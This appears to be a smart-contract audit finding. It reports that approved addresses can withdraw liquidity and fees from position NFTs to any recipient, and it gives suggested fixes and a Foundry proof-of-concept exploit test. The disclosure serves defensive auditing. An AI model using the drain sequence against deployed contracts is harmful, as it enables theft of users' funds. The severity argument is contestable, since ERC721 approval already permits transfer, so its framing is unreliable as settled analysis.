## Title
Approved Addresses Can Drain All Liquidity and Fees from Position NFTs Without Owner Consent

## Summary
The `BasePositions` contract allows approved addresses to withdraw liquidity and collect fees from position NFTs to arbitrary recipients, not just the NFT owner. This enables malicious approved addresses (e.g., compromised marketplace contracts) to drain positions without ever transferring the NFT, leaving owners with worthless tokens.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The protocol represents liquidity positions as ERC721 NFTs. When users approve an address for their position NFT (e.g., to list on a marketplace), the expectation is that the approved address can only transfer the NFT, consistent with standard ERC721 behavior.

**Actual Logic:** The `withdraw` and `collectFees` functions in `BasePositions` use the `authorizedForNft` modifier which allows BOTH owners AND approved addresses to call them. [2](#0-1) 

Critically, these functions accept a `recipient` parameter that can be ANY address, not restricted to msg.sender or the NFT owner:
- [3](#0-2) 
- [4](#0-3) 

**Exploitation Path:**
1. Alice owns Position NFT #123 with $100,000 in liquidity deposited in a pool
2. Alice approves OpenSea marketplace (or any contract) to list the NFT for sale using standard ERC721 `approve(marketplaceAddress, tokenId)`
3. Malicious actor with access to the approved address calls:
   - `positions.collectFees(123, poolKey, tickLower, tickUpper, attackerAddress)` - drains all accumulated fees
   - `positions.withdraw(123, poolKey, tickLower, tickUpper, fullLiquidity, attackerAddress, true)` - withdraws all liquidity
4. All funds are sent to `attackerAddress`, Alice still owns NFT #123 but it now has zero value

**Security Property Broken:** This violates the fundamental security assumption of ERC721 token approvals. Users expect that approving an address only grants permission to TRANSFER the NFT, not to extract its underlying value. This creates massive attack surface where every approval (marketplace listings, delegation contracts, etc.) becomes a potential vector for complete fund theft.

## Impact Explanation
- **Affected Assets**: All liquidity positions held as NFTs, accumulated fees in all positions
- **Damage Severity**: An approved address can drain 100% of a position's liquidity and fees. For a position with $100,000 liquidity, the entire amount can be stolen in a single transaction without the owner's knowledge.
- **User Impact**: Any user who has approved ANY address for their position NFT is at risk. Common scenarios include:
  - Marketplace listings (OpenSea, Blur, etc.)
  - Delegation to position managers
  - Smart contract integrations
  - Multi-sig wallets or custody solutions

## Likelihood Explanation
- **Attacker Profile**: Any address that has been approved for a position NFT. This includes:
  - Compromised marketplace contracts
  - Malicious marketplace operators  
  - Exploited delegation contracts
  - Any approved EOA or contract
- **Preconditions**: 
  - Target position must have liquidity deposited
  - Attacker must have approval (via `approve` or `setApprovalForAll`)
  - No additional preconditions needed
- **Execution Complexity**: Single transaction exploit. The attacker simply calls `withdraw` or `collectFees` with their own address as recipient.
- **Frequency**: Can be executed instantly after gaining approval. Each approved position is vulnerable until approval is revoked.

## Recommendation

The protocol should restrict value extraction operations to the NFT owner only, not approved addresses. Approvals should only enable NFT transfers, consistent with ERC721 standards.

**Option 1: Remove recipient parameter and send to msg.sender only** [1](#0-0) 

```solidity
// CURRENT (vulnerable):
function withdraw(
    uint256 id,
    PoolKey memory poolKey,
    int32 tickLower,
    int32 tickUpper,
    uint128 liquidity,
    address recipient,  // ← Allows arbitrary recipient
    bool withFees
) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
    // sends to recipient, not msg.sender
}

// FIXED:
function withdraw(
    uint256 id,
    PoolKey memory poolKey,
    int32 tickLower,
    int32 tickUpper,
    uint128 liquidity,
    bool withFees
) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
    // Always send to msg.sender, removing arbitrary recipient
    (amount0, amount1) = abi.decode(
        lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, msg.sender, withFees)),
        (uint128, uint128)
    );
}
```

**Option 2: Restrict value operations to owner only (Recommended)**

```solidity
// Create owner-only modifier
modifier onlyNftOwner(uint256 id) {
    if (msg.sender != _ownerOf(id)) {
        revert NotOwnerOfToken(msg.sender, id);
    }
    _;
}

// Apply to value-extracting functions
function withdraw(...) public payable onlyNftOwner(id) returns (...) {
    // Only NFT owner can withdraw, approved addresses cannot
}

function collectFees(...) public payable onlyNftOwner(id) returns (...) {
    // Only NFT owner can collect fees, approved addresses cannot
}

// Keep authorizedForNft for non-value operations like burn if needed
function burn(uint256 id) external payable authorizedForNft(id) {
    _burn(id);
}
```

**Option 3: Explicit owner check when recipient != msg.sender**

```solidity
function withdraw(
    uint256 id,
    PoolKey memory poolKey,
    int32 tickLower,
    int32 tickUpper,
    uint128 liquidity,
    address recipient,
    bool withFees
) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
    // If sending to different recipient, caller must be owner
    if (recipient != msg.sender && msg.sender != _ownerOf(id)) {
        revert OnlyOwnerCanSpecifyRecipient();
    }
    // Rest of function...
}
```

## Proof of Concept

```solidity
// File: test/Exploit_ApprovedDrain.t.sol
// Run with: forge test --match-test test_ApprovedCanDrainPosition -vvv

pragma solidity ^0.8.31;

import "./FullTest.sol";
import {CallPoints} from "../src/types/callPoints.sol";

contract Exploit_ApprovedDrain is FullTest {
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
        
        // Give Alice tokens
        token0.mint(alice, 1000e18);
        token1.mint(alice, 1000e18);
    }

    function test_ApprovedCanDrainPosition() public {
        // SETUP: Alice creates a position with significant liquidity
        vm.startPrank(alice);
        
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, CallPoints(false, false, false, false, false, false, false, false));
        
        token0.approve(address(positions), 1000e18);
        token1.approve(address(positions), 1000e18);
        
        (uint256 positionId, uint128 liquidity,,) = positions.mintAndDeposit(
            poolKey, 
            -100, 
            100, 
            1000e18,  // 1000 token0
            1000e18,  // 1000 token1
            0
        );
        
        uint256 aliceBalanceBeforeToken0 = token0.balanceOf(alice);
        uint256 aliceBalanceBeforeToken1 = token1.balanceOf(alice);
        
        // Alice approves attacker (simulating marketplace approval)
        positions.approve(attacker, positionId);
        
        vm.stopPrank();
        
        // EXPLOIT: Attacker drains the position
        vm.startPrank(attacker);
        
        // Attacker withdraws ALL liquidity to their own address
        (uint128 amount0, uint128 amount1) = positions.withdraw(
            positionId,
            poolKey,
            -100,
            100,
            liquidity,
            attacker,  // ← Sends funds to attacker, not Alice!
            true       // Also collect fees
        );
        
        vm.stopPrank();
        
        // VERIFY: Attacker received all funds, Alice received nothing
        assertGt(token0.balanceOf(attacker), 0, "Attacker should have stolen token0");
        assertGt(token1.balanceOf(attacker), 0, "Attacker should have stolen token1");
        
        // Alice's balance unchanged (she got nothing)
        assertEq(token0.balanceOf(alice), aliceBalanceBeforeToken0, "Alice should not have received token0");
        assertEq(token1.balanceOf(alice), aliceBalanceBeforeToken1, "Alice should not have received token1");
        
        // Alice still owns the NFT, but it's now worthless
        assertEq(positions.ownerOf(positionId), alice, "Alice still owns the NFT");
        
        // Position is now empty
        (uint128 remainingLiquidity,,,,) = positions.getPositionFeesAndLiquidity(
            positionId, 
            poolKey, 
            -100, 
            100
        );
        assertEq(remainingLiquidity, 0, "Position should be completely drained");
        
        // Vulnerability confirmed: Approved address drained position without transferring NFT
        assertTrue(amount0 > 0 && amount1 > 0, "Vulnerability confirmed: Approved address stole all liquidity");
    }
}
```

## Notes

This vulnerability fundamentally breaks the security model of position NFTs. Users have a reasonable expectation that approving an address for their NFT (a standard operation for marketplace listings) only grants transfer rights, not the ability to extract the underlying value. 

The issue is particularly severe because:
1. **Common user action**: Listing NFTs on marketplaces is extremely common
2. **Silent theft**: The attacker can drain the position without any visible ownership change
3. **Complete loss**: 100% of liquidity and fees can be stolen in one transaction
4. **Wide attack surface**: Every approval creates vulnerability (marketplaces, custody solutions, delegation contracts)

This differs from standard DeFi protocols where position tokens are typically ERC20s with no approval mechanism affecting the underlying position, or where NFT-based positions restrict value operations to owners only.

### Citations

**File:** src/base/BasePositions.sol (L110-117)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L328-328)
```text
            ACCOUNTANT.withdrawTwo(poolKey.token0, poolKey.token1, recipient, amount0, amount1);
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```
